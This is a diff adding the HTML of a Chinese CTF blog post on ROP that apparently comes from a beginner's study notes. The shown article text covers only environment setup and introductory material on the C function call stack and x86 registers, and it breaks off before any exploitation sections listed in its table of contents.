@@ -1,0 +1,1542 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>ROP | C6jU3のblog</title>
+  <meta name="keywords" content=" ROP ">
+  <meta name="description" content="ROP | C6jU3のblog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="欢迎交流刚入坑的萌新，本站所写仅表示个人拙见，如有不当多多担待 联系方式 QQ：417148909 邮箱：&amp;#x63;&amp;#103;&amp;#106;&amp;#x75;&amp;#x65;&amp;#x38;&amp;#55;&amp;#x31;&amp;#x40;&amp;#49;&amp;#x36;&amp;#x33;&amp;#46;&amp;#99;&amp;#x6f;&amp;#x6d;">
+<meta property="og:type" content="website">
+<meta property="og:title" content="关于">
+<meta property="og:url" content="https://blog.cgjue.cn/about/index.html">
+<meta property="og:site_name" content="C6jU3のblog">
+<meta property="og:description" content="欢迎交流刚入坑的萌新，本站所写仅表示个人拙见，如有不当多多担待 联系方式 QQ：417148909 邮箱：&amp;#x63;&amp;#103;&amp;#106;&amp;#x75;&amp;#x65;&amp;#x38;&amp;#55;&amp;#x31;&amp;#x40;&amp;#49;&amp;#x36;&amp;#x33;&amp;#46;&amp;#99;&amp;#x6f;&amp;#x6d;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-07-16T12:58:30.000Z">
+<meta property="article:modified_time" content="2024-03-05T11:50:05.184Z">
+<meta property="article:author" content="C6jU3">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.png">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/github.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.png"/>
+</a>
+<div class="author">
+    <span>C6jU3</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="github"
+               href="https://blog.cgjue.cn"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="email"
+               href="mailto:cgjue871@163.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="qq"
+               href="http://wpa.qq.com/msgrd?v=3&uin=417148909&site=qq&menu=yes"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-qq"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="全部文章">全部文章
+            
+                <small>(28)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+                
+    <li>
+        <div data-rel="CTF">
+            <i class="fold iconfont icon-right"></i>
+            CTF
+            <small>(20)</small>
+        </div>
+        
+            <ul class="sub hide">
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY">
+            <i class="fold iconfont icon-right"></i>
+            STUDY
+            <small>(14)</small>
+        </div>
+        
+            <ul class="sub hide">
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;CRYPTO">
+            <i class="fold iconfont icon-right"></i>
+            CRYPTO
+            <small>(3)</small>
+        </div>
+        
+            <ul class="sub hide">
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;CRYPTO&lt;---&gt;RSA">
+            
+            RSA
+            <small>(3)</small>
+        </div>
+        
+    </li>
+
+                
+            </ul>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;MISC">
+            <i class="fold iconfont icon-right"></i>
+            MISC
+            <small>(1)</small>
+        </div>
+        
+            <ul class="sub hide">
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;MISC&lt;---&gt;Godzilla">
+            
+            Godzilla
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+            </ul>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;PWN">
+            <i class="fold iconfont icon-right"></i>
+            PWN
+            <small>(1)</small>
+        </div>
+        
+            <ul class="sub hide">
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;PWN&lt;---&gt;ROP">
+            
+            ROP
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+            </ul>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB">
+            <i class="fold iconfont icon-right"></i>
+            WEB
+            <small>(8)</small>
+        </div>
+        
+            <ul class="sub hide">
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB&lt;---&gt;反序列化">
+            <i class="fold iconfont icon-right"></i>
+            反序列化
+            <small>(3)</small>
+        </div>
+        
+            <ul class="sub hide">
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB&lt;---&gt;反序列化&lt;---&gt;反序列化基础">
+            
+            反序列化基础
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB&lt;---&gt;反序列化&lt;---&gt;字符串逃逸">
+            
+            字符串逃逸
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB&lt;---&gt;反序列化&lt;---&gt;Phar">
+            
+            Phar
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+            </ul>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB&lt;---&gt;JWT">
+            
+            JWT
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB&lt;---&gt;RCE">
+            
+            RCE
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB&lt;---&gt;SSRF">
+            
+            SSRF
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB&lt;---&gt;struts2">
+            
+            struts2
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB&lt;---&gt;Unicode">
+            
+            Unicode
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+            </ul>
+        
+    </li>
+
+                
+            </ul>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;WP">
+            
+            WP
+            <small>(6)</small>
+        </div>
+        
+    </li>
+
+                
+            </ul>
+        
+    </li>
+
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+                
+    <li>
+        <div data-rel="JAVA">
+            <i class="fold iconfont icon-right"></i>
+            JAVA
+            <small>(1)</small>
+        </div>
+        
+            <ul class="sub hide">
+                
+                    
+    <li>
+        <div data-rel="JAVA&lt;---&gt;study">
+            
+            study
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+            </ul>
+        
+    </li>
+
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+                
+    <li>
+        <div data-rel="SOME">
+            <i class="fold iconfont icon-right"></i>
+            SOME
+            <small>(7)</small>
+        </div>
+        
+            <ul class="sub hide">
+                
+                    
+    <li>
+        <div data-rel="SOME&lt;---&gt;hexo">
+            
+            hexo
+            <small>(2)</small>
+        </div>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="SOME&lt;---&gt;life">
+            
+            life
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="SOME&lt;---&gt;linux">
+            
+            linux
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="SOME&lt;---&gt;Tools">
+            
+            Tools
+            <small>(3)</small>
+        </div>
+        
+    </li>
+
+                
+            </ul>
+        
+    </li>
+
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">关于</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">友链</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="28">
+<input type="hidden" id="yelog_site_word_count" value="50.1k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://blog.shenghuo2.top/">shenghuo2</a></li>
+            
+            <li><a target="_blank" href="http://blog.q1ngchuan.top/">晴川</a></li>
+            
+            <li><a target="_blank" href="https://yhuanhuan01.github.io/">yhuanhuan</a></li>
+            
+            <li><a target="_blank" href="https://shenshuoyaoyouguangha.github.io/">wuming</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>建站</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>crypto</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>CTF</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Godzilla</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>java</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>rce</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ROP</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssrf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>tool</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Unicode</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>unserialize</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>web</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="全部文章 SOME Tools "
+           href="/2024/03/13/Beautify-Shell/"
+           data-tag="tool"
+           data-author="" >
+            <span class="post-title" title="Beautify_Shell">Beautify_Shell</span>
+            <span class="post-date" title="2024-03-13 16:36:20">2024/03/13</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF WP "
+           href="/2024/03/11/HSCCTF-2024/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="HSCCTF#2024">HSCCTF#2024</span>
+            <span class="post-date" title="2024-03-11 18:02:20">2024/03/11</span>
+        </a>
+        
+        
+        <a  class="全部文章 SOME Tools "
+           href="/2024/03/05/qqnt/"
+           data-tag="tool"
+           data-author="" >
+            <span class="post-title" title="NT">NT</span>
+            <span class="post-date" title="2024-03-05 16:12:03">2024/03/05</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF WP "
+           href="/2024/03/04/qsnctf2024-Round-1/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="青少年ctf2024#Round_1">青少年ctf2024#Round_1</span>
+            <span class="post-date" title="2024-03-04 18:10:24">2024/03/04</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY WEB struts2 "
+           href="/2023/11/03/java/"
+           data-tag="java"
+           data-author="" >
+            <span class="post-title" title="struts2">struts2</span>
+            <span class="post-date" title="2023-11-03 18:36:25">2023/11/03</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY PWN ROP "
+           href="/2023/09/16/pwn/"
+           data-tag="ROP"
+           data-author="" >
+            <span class="post-title" title="ROP">ROP</span>
+            <span class="post-date" title="2023-09-16 14:57:02">2023/09/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF WP "
+           href="/2023/09/10/SICTF-2nd/"
+           data-tag="CTF"
+           data-author="" >
+            <span class="post-title" title="SICTF-2nd">SICTF-2nd</span>
+            <span class="post-date" title="2023-09-10 15:15:29">2023/09/10</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF WP "
+           href="/2023/09/04/nepctf-2023/"
+           data-tag="CTF"
+           data-author="" >
+            <span class="post-title" title="nepctf-2023">nepctf-2023</span>
+            <span class="post-date" title="2023-09-04 19:18:35">2023/09/04</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF WP "
+           href="/2023/08/29/NSSCTF-2nd/"
+           data-tag="CTF"
+           data-author="" >
+            <span class="post-title" title="NSSCTF-2nd">NSSCTF-2nd</span>
+            <span class="post-date" title="2023-08-29 11:04:56">2023/08/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY MISC Godzilla "
+           href="/2023/08/09/HK/"
+           data-tag="Godzilla"
+           data-author="" >
+            <span class="post-title" title="HK的怪兽">HK的怪兽</span>
+            <span class="post-date" title="2023-08-09 00:36:08">2023/08/09</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY CRYPTO RSA "
+           href="/2023/08/07/Wilson/"
+           data-tag="crypto"
+           data-author="" >
+            <span class="post-title" title="Wilson">Wilson</span>
+            <span class="post-date" title="2023-08-07 01:59:13">2023/08/07</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY WEB 反序列化 Phar "
+           href="/2023/08/06/Phar/"
+           data-tag="unserialize"
+           data-author="" >
+            <span class="post-title" title="Phar">Phar</span>
+            <span class="post-date" title="2023-08-06 12:38:09">2023/08/06</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY WEB Unicode "
+           href="/2023/07/30/checkin/"
+           data-tag="Unicode"
+           data-author="" >
+            <span class="post-title" title="checkin">checkin</span>
+            <span class="post-date" title="2023-07-30 09:56:10">2023/07/30</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY WEB JWT "
+           href="/2023/07/29/jwtstruts/"
+           data-tag="unserialize"
+           data-author="" >
+            <span class="post-title" title="Jwt&amp;struts2">Jwt&amp;struts2</span>
+            <span class="post-date" title="2023-07-29 14:49:15">2023/07/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY CRYPTO RSA "
+           href="/2023/07/23/CRT/"
+           data-tag="crypto"
+           data-author="" >
+            <span class="post-title" title="CRT">CRT</span>
+            <span class="post-date" title="2023-07-23 19:09:47">2023/07/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY WEB 反序列化 字符串逃逸 "
+           href="/2023/07/23/strout/"
+           data-tag="unserialize"
+           data-author="" >
+            <span class="post-title" title="PHP反序列化字符串逃逸">PHP反序列化字符串逃逸</span>
+            <span class="post-date" title="2023-07-23 17:48:49">2023/07/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY WEB 反序列化 反序列化基础 "
+           href="/2023/07/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="unserialize"
+           data-author="" >
+            <span class="post-title" title="PHP反序列化">PHP反序列化</span>
+            <span class="post-date" title="2023-07-23 17:48:49">2023/07/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 SOME Tools "
+           href="/2023/07/22/sagemath/"
+           data-tag="crypto"
+           data-author="" >
+            <span class="post-title" title="Sagemath">Sagemath</span>
+            <span class="post-date" title="2023-07-22 19:45:36">2023/07/22</span>
+        </a>
+        
+        
+        <a  class="全部文章 SOME linux "
+           href="/2023/07/22/AddSCSI/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="AddSCSI">AddSCSI</span>
+            <span class="post-date" title="2023-07-22 19:44:36">2023/07/22</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY WEB SSRF "
+           href="/2023/07/18/SSRF/"
+           data-tag="ssrf"
+           data-author="" >
+            <span class="post-title" title="SSRF学习总结">SSRF学习总结</span>
+            <span class="post-date" title="2023-07-18 09:20:58">2023/07/18</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY WEB RCE "
+           href="/2023/07/18/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/"
+           data-tag="rce"
+           data-author="" >
+            <span class="post-title" title="无数字字母rce">无数字字母rce</span>
+            <span class="post-date" title="2023-07-18 09:20:58">2023/07/18</span>
+        </a>
+        
+        
+        <a  class="全部文章 SOME hexo "
+           href="/2023/07/17/fluid/"
+           data-tag="建站"
+           data-author="" >
+            <span class="post-title" title="Fluid">Fluid</span>
+            <span class="post-date" title="2023-07-17 18:00:55">2023/07/17</span>
+        </a>
+        
+        
+        <a  class="全部文章 SOME hexo "
+           href="/2023/07/17/hexo/"
+           data-tag="建站"
+           data-author="" >
+            <span class="post-title" title="Hexo+Github">Hexo+Github</span>
+            <span class="post-date" title="2023-07-17 17:24:10">2023/07/17</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY CRYPTO RSA "
+           href="/2023/07/16/00-01/"
+           data-tag="crypto"
+           data-author="" >
+            <span class="post-title" title="低加密指数广播攻击">低加密指数广播攻击</span>
+            <span class="post-date" title="2023-07-16 21:16:52">2023/07/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 SOME life "
+           href="/2023/07/16/hello-world/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="萌新">萌新</span>
+            <span class="post-date" title="2023-07-16 21:16:52">2023/07/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 JAVA study "
+           href="/2023/07/16/javabase/"
+           data-tag="java"
+           data-author="" >
+            <span class="post-title" title="JavaStudy">JavaStudy</span>
+            <span class="post-date" title="2023-07-16 21:16:52">2023/07/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF WP "
+           href="/2023/06/04/CISCN-2023/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CISCN#2023">CISCN#2023</span>
+            <span class="post-date" title="2023-06-04 19:06:30">2023/06/04</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY "
+           href="/2023/01/02/%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/"
+           data-tag="web"
+           data-author="" >
+            <span class="post-title" title="暑假学习路线">暑假学习路线</span>
+            <span class="post-date" title="2023-01-02 09:20:58">2023/01/02</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-pwn" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">ROP</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="CTF">CTF</a> > 
+            
+            <a  data-rel="CTF&lt;---&gt;STUDY">STUDY</a> > 
+            
+            <a  data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;PWN">PWN</a> > 
+            
+            <a  data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;PWN&lt;---&gt;ROP">ROP</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color4">ROP</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2024-03-07 18:47:01'>2023-09-16 14:57</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:4.3k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwntools-set-up"><span class="toc-text">Pwntools set up!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-text">环境!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">一些前置知识!</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88"><span class="toc-text">C语言函数调用栈</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%90%AC%E8%BF%90%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">一些搬运的知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-text">寄存器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ESP-Stack-Pointer"><span class="toc-text">ESP(Stack  Pointer)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EBP-Base-Pointer"><span class="toc-text">EBP(Base  Pointer)</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Study-Now"><span class="toc-text">Study Now!</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88"><span class="toc-text">栈</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A0%88%E4%BB%8B%E7%BB%8D"><span class="toc-text">基本栈介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-text">基础栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A5%E4%B8%AA%E6%B5%8B%E8%AF%95%E7%A8%8B%E5%BA%8F"><span class="toc-text">来个测试程序</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BC%96%E8%AF%91"><span class="toc-text">编译</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="toc-text">反编译</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E5%AF%BB%E6%89%BE%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-text">1、寻找危险函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E7%A1%AE%E5%AE%9A%E5%A1%AB%E5%85%85%E9%95%BF%E5%BA%A6"><span class="toc-text">2、确定填充长度</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%ACROP"><span class="toc-text">基本ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Ret2text"><span class="toc-text">Ret2text</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A5%E4%B8%AA%E6%A0%97%E5%AD%90"><span class="toc-text">来个栗子</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Practise"><span class="toc-text">Practise!</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ret2text-1"><span class="toc-text">Ret2text</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec"><span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ida32"><span class="toc-text">ida32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-text">exp</span></a></li></ol></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-6 i,
+    .toc-level-6 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Pwntools-set-up"><a href="#Pwntools-set-up" class="headerlink" title="Pwntools set up!"></a>Pwntools set up!</h1><p><del>刚入坑，听师傅们说，学pwn会不幸</del></p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境!"></a>环境!</h1><p>先配置环境，用到神器<a target="_blank" rel="noopener" href="https://www.baidu.com/">百度</a></p>
+<p>这里用的Ubuntu18.04.6</p>
+<h1 id="一些前置知识"><a href="#一些前置知识" class="headerlink" title="一些前置知识!"></a>一些前置知识!</h1><p>刚刚开始，会慢慢补充，当然还是从ctf中学习</p>
+<p>可以了解先一下C语言函数调用栈，栈的结构等</p>
+<h3 id="C语言函数调用栈"><a href="#C语言函数调用栈" class="headerlink" title="C语言函数调用栈"></a>C语言函数调用栈</h3><ul>
+<li><p><a target="_blank" rel="noopener" href="http://www.cnblogs.com/clover-toeic/p/3755401.html">C 语言函数调用栈 (一)</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://www.cnblogs.com/clover-toeic/p/3756668.html">C 语言函数调用栈 (二)</a></p>
+</li>
+</ul>
+<h4 id="一些搬运的知识点"><a href="#一些搬运的知识点" class="headerlink" title="一些搬运的知识点"></a>一些搬运的知识点</h4><p><strong>主要介绍函数调用</strong></p>
+<p>程序的执行过程可看作连续的函数调用</p>
+<p>当一个函数执行完毕时，程序要回到调用指令的下一条指令(紧接call指令)处继续执行。</p>
+<p>函数调用过程通常使用堆栈实现，每个用户态进程对应一个调用栈结构(call stack)。</p>
+<p>编译器使用堆栈传递函数参数、保存返回地址、临时保存寄存器原有值(即函数调用的上下文)以备恢复以及存储本地局部变量。</p>
+<h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p><strong>顾名思义，存储数据和指令的</strong></p>
+<p>寄存器是处理器加工数据或运行程序的重要载体，用于存放程序执行中用到的数据和指令</p>
+<p>32位处理器包含8个四字节寄存器（32&#x3D;8*4）</p>
+<p><img src="/img/271639137915732.jpg"></p>
+<p><strong>指令寄存器EIP</strong> </p>
